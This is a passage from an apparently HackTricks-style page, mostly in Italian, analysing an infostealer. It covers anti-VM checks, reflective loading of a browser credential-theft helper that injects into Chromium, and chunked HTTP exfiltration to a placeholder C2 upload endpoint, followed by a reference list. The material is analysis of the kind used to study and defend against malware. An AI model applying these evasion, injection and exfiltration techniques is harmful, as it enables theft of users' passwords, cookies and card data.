Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica a più livelli di `check_antivm`

- Variant A scorre la lista dei processi, effettua l'hash di ogni nome con un checksum rotante personalizzato e lo confronta con blocklist embedded per debugger/sandbox; ripete il checksum sul nome del computer e controlla working directories come `C:\analysis`.
- Variant B ispeziona proprietà di sistema (soglia del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare VirtualBox additions, e esegue check temporali attorno a sleep per individuare single-stepping. Qualsiasi hit interrompe l'esecuzione prima del lancio dei moduli.

### Fileless helper + double ChaCha20 reflective loading

- La DLL/EXE principale incorpora un Chromium credential helper che viene o dropped to disk o manually mapped in-memory; il fileless mode risolve imports/relocations da solo così non vengono scritti artefatti del helper.
- Quel helper conserva una DLL second-stage criptata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambe le passate, reflectively loads the blob (no `LoadLibrary`) e invoca le export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivate da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine ChromElevator utilizzano direct-syscall reflective process hollowing per inject in un Chromium browser live, ereditare AppBound Encryption keys e decrypt passwords/cookies/credit cards direttamente dai database SQLite nonostante l'hardening ABE.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itera una tabella globale di puntatori a funzione `memory_generators` e genera un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file dopo una finestra di join di ~45s.
- Una volta completato, tutto viene compresso con la libreria statically linked `miniz` come `%TEMP%\\Log.zip`. `ThreadPayload1` quindi dorme 15s e streamma l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, spoofando un browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk appende `complete: true` così il C2 sa che il riassemblaggio è completo.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
